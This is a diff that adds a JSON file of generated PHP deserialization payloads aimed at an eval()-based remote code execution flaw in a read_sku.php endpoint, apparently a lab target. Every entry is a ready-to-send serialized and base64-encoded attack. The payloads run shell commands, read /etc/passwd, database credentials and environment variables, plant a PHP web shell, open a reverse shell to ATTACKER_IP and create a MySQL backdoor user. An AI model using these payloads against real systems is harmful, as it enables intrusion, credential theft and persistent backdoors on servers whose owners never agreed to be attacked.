@@ -1,0 +1,133 @@
+{
+  "generator": "PHPSerializationPayloadGenerator",
+  "target": "http://skumodel:4455/read_sku.php",
+  "vulnerability": "PHP Object Injection + eval() RCE",
+  "payloads": [
+    {
+      "name": "File Write (Proof of RCE)",
+      "php_code": "file_put_contents('/tmp/pwned_by_deserialization.txt', 'RCE executed at ' . date('Y-m-d H:i:s'));",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:97:\"file_put_contents('/tmp/pwned_by_deserialization.txt', 'RCE executed at ' . date('Y-m-d H:i:s'));\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6OTc6ImZpbGVfcHV0X2NvbnRlbnRzKCcvdG1wL3B3bmVkX2J5X2Rlc2VyaWFsaXphdGlvbi50eHQnLCAnUkNFIGV4ZWN1dGVkIGF0ICcgLiBkYXRlKCdZLW0tZCBIOmk6cycpKTsiO30=",
+      "length": 173,
+      "base64_length": 232,
+      "description": "Write a file to /tmp to prove code execution"
+    },
+    {
+      "name": "Command Execution - whoami",
+      "php_code": "echo shell_exec('whoami');",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:26:\"echo shell_exec('whoami');\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6MjY6ImVjaG8gc2hlbGxfZXhlYygnd2hvYW1pJyk7Ijt9",
+      "length": 102,
+      "base64_length": 136,
+      "description": "Execute whoami command"
+    },
+    {
+      "name": "Command Execution - id",
+      "php_code": "echo shell_exec('id');",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:22:\"echo shell_exec('id');\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6MjI6ImVjaG8gc2hlbGxfZXhlYygnaWQnKTsiO30=",
+      "length": 98,
+      "base64_length": 132,
+      "description": "Execute id command"
+    },
+    {
+      "name": "System Information",
+      "php_code": "echo json_encode(['rce' => 'success', 'php_version' => phpversion(), 'user' => get_current_user(), 'cwd' => getcwd(), 'uname' => php_uname()]);",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:143:\"echo json_encode(['rce' => 'success', 'php_version' => phpversion(), 'user' => get_current_user(), 'cwd' => getcwd(), 'uname' => php_uname()]);\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6MTQzOiJlY2hvIGpzb25fZW5jb2RlKFsncmNlJyA9PiAnc3VjY2VzcycsICdwaHBfdmVyc2lvbicgPT4gcGhwdmVyc2lvbigpLCAndXNlcicgPT4gZ2V0X2N1cnJlbnRfdXNlcigpLCAnY3dkJyA9PiBnZXRjd2QoKSwgJ3VuYW1lJyA9PiBwaHBfdW5hbWUoKV0pOyI7fQ==",
+      "length": 220,
+      "base64_length": 296,
+      "description": "Dump PHP environment and system information"
+    },
+    {
+      "name": "List /tmp Directory",
+      "php_code": "echo json_encode(scandir('/tmp'));",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:34:\"echo json_encode(scandir('/tmp'));\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6MzQ6ImVjaG8ganNvbl9lbmNvZGUoc2NhbmRpcignL3RtcCcpKTsiO30=",
+      "length": 110,
+      "base64_length": 148,
+      "description": "List files in /tmp directory"
+    },
+    {
+      "name": "Read /etc/passwd",
+      "php_code": "echo file_get_contents('/etc/passwd');",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:38:\"echo file_get_contents('/etc/passwd');\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6Mzg6ImVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvcGFzc3dkJyk7Ijt9",
+      "length": 114,
+      "base64_length": 152,
+      "description": "Read /etc/passwd file"
+    },
+    {
+      "name": "Read /etc/hostname",
+      "php_code": "echo file_get_contents('/etc/hostname');",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:40:\"echo file_get_contents('/etc/hostname');\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6NDA6ImVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvaG9zdG5hbWUnKTsiO30=",
+      "length": 116,
+      "base64_length": 156,
+      "description": "Read hostname"
+    },
+    {
+      "name": "Create Web Shell",
+      "php_code": "file_put_contents('/tmp/shell.php', '<?php system($_GET[\"cmd\"]); ?>');",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:70:\"file_put_contents('/tmp/shell.php', '<?php system($_GET[\"cmd\"]); ?>');\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6NzA6ImZpbGVfcHV0X2NvbnRlbnRzKCcvdG1wL3NoZWxsLnBocCcsICc8P3BocCBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4nKTsiO30=",
+      "length": 146,
+      "base64_length": 196,
+      "description": "Create a simple PHP webshell"
+    },
+    {
+      "name": "Reverse Shell (Bash)",
+      "php_code": "$sock=fsockopen('ATTACKER_IP',ATTACKER_PORT);exec('/bin/bash -i <&3 >&3 2>&3');",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:79:\"$sock=fsockopen('ATTACKER_IP',ATTACKER_PORT);exec('/bin/bash -i <&3 >&3 2>&3');\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6Nzk6IiRzb2NrPWZzb2Nrb3BlbignQVRUQUNLRVJfSVAnLEFUVEFDS0VSX1BPUlQpO2V4ZWMoJy9iaW4vYmFzaCAtaSA8JjMgPiYzIDI+JjMnKTsiO30=",
+      "length": 155,
+      "base64_length": 208,
+      "description": "Reverse shell to attacker machine (template)"
+    },
+    {
+      "name": "List PHP Configuration",
+      "php_code": "echo json_encode(ini_get_all());",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:32:\"echo json_encode(ini_get_all());\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6MzI6ImVjaG8ganNvbl9lbmNvZGUoaW5pX2dldF9hbGwoKSk7Ijt9",
+      "length": 108,
+      "base64_length": 144,
+      "description": "Show PHP configuration"
+    },
+    {
+      "name": "Extract Database Credentials",
+      "php_code": "echo file_get_contents('database.php');",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:39:\"echo file_get_contents('database.php');\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6Mzk6ImVjaG8gZmlsZV9nZXRfY29udGVudHMoJ2RhdGFiYXNlLnBocCcpOyI7fQ==",
+      "length": 115,
+      "base64_length": 156,
+      "description": "Read database configuration"
+    },
+    {
+      "name": "Execute Arbitrary Script",
+      "php_code": "include('/tmp/malicious.php');",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:30:\"include('/tmp/malicious.php');\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6MzA6ImluY2x1ZGUoJy90bXAvbWFsaWNpb3VzLnBocCcpOyI7fQ==",
+      "length": 106,
+      "base64_length": 144,
+      "description": "Execute PHP script from file"
+    },
+    {
+      "name": "Create Backdoor User (MySQL)",
+      "php_code": "$db = new PDO('mysql:host=localhost', 'root', 'password'); $db->exec(\"CREATE USER 'hacker'@'%' IDENTIFIED BY 'hacked';\");",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:121:\"$db = new PDO('mysql:host=localhost', 'root', 'password'); $db->exec(\"CREATE USER 'hacker'@'%' IDENTIFIED BY 'hacked';\");\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6MTIxOiIkZGIgPSBuZXcgUERPKCdteXNxbDpob3N0PWxvY2FsaG9zdCcsICdyb290JywgJ3Bhc3N3b3JkJyk7ICRkYi0+ZXhlYygiQ1JFQVRFIFVTRVIgJ2hhY2tlcidAJyUnIElERU5USUZJRUQgQlkgJ2hhY2tlZCc7Iik7Ijt9",
+      "length": 198,
+      "base64_length": 264,
+      "description": "Create MySQL backdoor user"
+    },
+    {
+      "name": "Dump Environment Variables",
+      "php_code": "echo json_encode($_ENV);",
+      "serialized": "O:14:\"CustomTemplate\":2:{s:8:\"template\";s:9:\"test.twig\";s:4:\"data\";s:24:\"echo json_encode($_ENV);\";}",
+      "base64": "TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6ODoidGVtcGxhdGUiO3M6OToidGVzdC50d2lnIjtzOjQ6ImRhdGEiO3M6MjQ6ImVjaG8ganNvbl9lbmNvZGUoJF9FTlYpOyI7fQ==",
+      "length": 100,
+      "base64_length": 136,
+      "description": "Extract all environment variables"
+    }
+  ]
+}
